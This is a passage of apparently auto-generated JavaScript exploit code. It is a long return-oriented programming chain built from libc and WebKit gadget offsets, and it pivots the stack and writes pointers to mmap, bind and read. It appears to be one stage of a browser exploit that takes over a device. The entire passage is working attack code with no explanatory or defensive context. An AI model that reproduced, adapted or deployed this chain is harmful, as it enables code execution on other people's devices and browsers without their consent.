libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+212648, //L3474
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3474:
db([0, 0]); // 0x0
//L2975:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
mmap_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+213976, //L3475
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3475:
db([0, 0]); // 0x0
//L3457:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([216, 0]); // 0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967072, 4294967295]); // -0xe0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967216, 4294967295]); // -0x50
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+547950, //mov rcx, [rdi + 0x18] ; lea rax, [rax + rcx - 1]
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([1, 0]); // 0x1
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+215352, //L3476
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3476:
db([0, 0]); // 0x0
//L3225:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
bind_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+216680, //L3477
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3477:
db([0, 0]); // 0x0
//L3339:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
read_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+218008, //L3478
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L3478:
db([0, 0]); // 0x0
//L3258:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
